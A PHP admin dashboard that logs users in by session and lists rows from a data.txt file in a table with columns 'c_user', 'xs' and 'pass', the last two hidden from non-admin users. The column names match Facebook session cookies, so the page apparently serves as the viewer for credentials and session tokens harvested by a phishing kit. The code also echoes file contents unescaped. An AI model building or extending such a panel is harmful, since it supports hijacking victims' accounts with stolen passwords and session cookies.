<?php
// Start the session at the very beginning of the script
session_start();

// Rest of your admin panel logic...

// // Redirect to login page if not logged in
if (!isset($_SESSION['username'])) {
    header("Location: login.php");
    exit();
}
// Check if the user clicked the logout button
if (isset($_POST['logout'])) {
    // Clear session variables and destroy the session
    session_unset();
    session_destroy();
    header("Location: login.php"); // Redirect to the login page after logout
    exit();
}
if (isset($_POST['delete'])) {
    $rowToDelete = $_POST['delete_row'];
    
    // Read data from the data.txt file
    $data = file_get_contents('data.txt');
    $data = explode(PHP_EOL, $data);

    // Find and remove the selected row from the array
    $key = array_search($rowToDelete, $data);
    if ($key !== false) {
        unset($data[$key]);
    }

    // Save the updated data back to data.txt
    file_put_contents('data.txt', implode(PHP_EOL, $data));

    // Redirect to the current page to refresh the table
    header("Location: admin.php");
    exit();
}

// Read data from the data.txt file
$data = file_get_contents('data.txt');
$data = explode(PHP_EOL, $data); // Split the data into an array based on line breaks
?>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <!-- Include Bootstrap CSS link -->
    <style>
        th {
            text-align: center; /* Center-align the text in table headers */
        }
    </style>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
</head>
<body>
    <div class="container mt-5">
        <h1 class="mb-4">Welcome to the Admin Dashboard,</h1>
        <!-- Apply Bootstrap table styling -->
        <?php 
        $fileContent = file_get_contents('data.txt');
        $lines = explode("\n", $fileContent);

// Output table headers in the admin panel
echo '<table class="table">
        <tr>';
        if($_SESSION['username'] == "admin"){
           echo' <th>c_user</th>
            <th>xs</th>';
        }
echo '            <th>pass</th>
        </tr>';

// Loop through each line and extract values
foreach ($lines as $line) {
    // Explode each line into an array of values
    $values = explode(',', $line);

    // Output a table row for each line
  $count = 1;
    echo '<tr>';
    foreach ($values as $value) {
      if($count <= 2 && $_SESSION['username'] != "admin"){
        $count++;
      continue;
      }
        echo '<td>' . trim($value) . '</td>';
    }
    echo '</tr>';
}

// Close the table
echo '</table>';
?>
        <form method="POST">
            <button type="submit" class="btn btn-danger" name="logout">Logout</button>
        </form>
    </div>

    <!-- Include Bootstrap JS and jQuery -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
